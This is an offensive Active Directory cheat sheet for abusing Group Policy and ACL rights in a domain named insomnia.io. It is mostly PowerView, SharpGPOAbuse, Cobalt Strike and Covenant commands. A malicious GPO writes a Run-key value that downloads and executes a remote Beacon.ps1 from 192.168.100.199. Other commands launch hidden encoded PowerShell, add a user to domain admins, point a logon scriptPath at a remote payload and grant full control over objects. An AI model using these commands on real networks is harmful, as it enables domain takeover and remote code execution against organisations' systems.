



### Initial Reconnaissance

Which User had authorized to Manage GPLINK for a Given OU.
```
powershell Get-DomainGPOLocalGroup | select GroupName,GPODisplayName,GPOType,GPOName
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link"}
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

```
### Group or Member listed 
```
powershell Get-DomainOU -GPLink '{A572138C-69A5-4A6B-8210-FE08E6B0282D}' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}
```
### To Hunt Down writable permission GPO to the GP-Link attribute on OU
```
powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
PowerShell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Type OU Object Here " -or $_.DistinguishedName -match "OU=OU=Type OU Object Here " } | select DnsHostName

```
### Create a new GPO 

Being able to write anything, anywhere into the HKLM or HKCU hives presents lots of different options for achieving code execution.
One simple way is to create a new autorun value to run a PowerShell Launcher.
```
powershell New-GPO -Name 'MeMe GPO' | New-GPLink -Target 'OU=Type OU Object Here Writtable OU ,OU=Workstations,DC=insomnia,DC=io'
PowerShell Set-GPPrefRegistryValue -Name 'MeMe GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'powershell -w 1 -c "iex (new-object net.webclient).downloadstring(''http://192.168.100.199:9090/Beacon.ps1'')"' -Type ExpandString

#Cobalt
execute-assembly C:\Users\Public\\SharpGPOAbuse.exe --AddComputerTask --TaskName "MeMe Task" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c powershell -nop -w hidden -enc cABv[...snip...]ACIA" --GPOName "MeMe GPO"

#Covenant
Assembly /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"MeMe Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c powershell -nop -w hidden -enc [...snip...]\" --GPOName \"Another MeMe GPO\""

```

### Which User could be able to authorized to modify the Existing GPO
```
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | WhereObject { $_.ActiveDirectoryRights -match "WriteProperty| WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "SID-[\d]{4,10}"}

ls \\insomnia.io\SYSVOL\insomnia.io\Policies\
ls \\insomnia.io\SYSVOL\insomnia.io\Policies\{66E4449B-408B-490A-A3F5-DA8B934DA2AC}


powershell Get-DomainGPO -Identity "MeMe GPO" -Properties VersionNumber
powershell Get-DomainGPO -Identity "MeMe GPO" | Set-DomainObject -Set @{'versionnumber'='1337'}
powershell Get-DomainGPO -Identity "MeMe GPO" | SetDomainObject -Set @{'versionnumber'='1337'}
```
### GenericAll: 
```
The attacker is able to control the specific object that has the GenericAll ACE and it can be exploited using the Set-DomainUserPassword or Add-DomainGroupMember methods
net group "domain admins" MeMe /add /domain
```

### GenericWrite
```
The ability to update any non-protected target object parameter value. For example, update the “scriptPath” parameter value on a target user object to cause that user to run your specified executable/commands the next time that user logs on. Abused with Set-DomainObject.
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\payloadst.ps1"
```

### WriteDACL
```
The ability to write a new ACE to the target object’s DACL. For example, an attacker may write a new ACE to the target object DACL giving the attacker “full control” of the target object. Abused with Add-NewADObjectAccessControlEntry

#grant the "MeMe" account user full control over the "DC-1" user:
Add-DomainObjectAcl -TargetIdentity DC-1 -PrincipalIdentity MeMe -Rights All -Verbose
net group backup_admins
net group backup_admins MeMe /add


```

### WriteOwner
```
The attacker here is able to change the owner of an object. When this happens the attacker could then, for example, proceed to change the user's password. To take over the object we can use the Set-DomainObjectOwner method

```
The Powerview Enumeration The User could be able to create A new GPO
```
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=insomnia.,DC=io" -ResolveGUIDs | Where-Object { $_.ObjectAceType -eq "Group-Policy-Container" } 

```
To Figure out who User is belong to Group
```
powershell ConvertFrom-SID S-1-5-21-3865823697-1816233505-1834004910-1605
```
